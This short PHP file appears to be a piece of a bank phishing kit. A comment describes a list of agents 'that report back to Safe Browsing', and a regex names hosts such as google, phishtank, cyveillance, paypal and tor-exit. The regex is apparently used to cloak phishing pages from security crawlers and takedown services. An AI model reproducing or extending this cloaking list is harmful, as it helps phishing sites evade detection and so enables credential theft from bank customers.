<?php

//this file contains useragents that report back to Safe Browsing for bank phishing. realtime updated list as of 20/08/22.

$bots_host = "/above|google|softlayer|cyveillance|phishtank|dreamhost|netpilot|calyxinstitute|tor-exit|paypal/i";

?>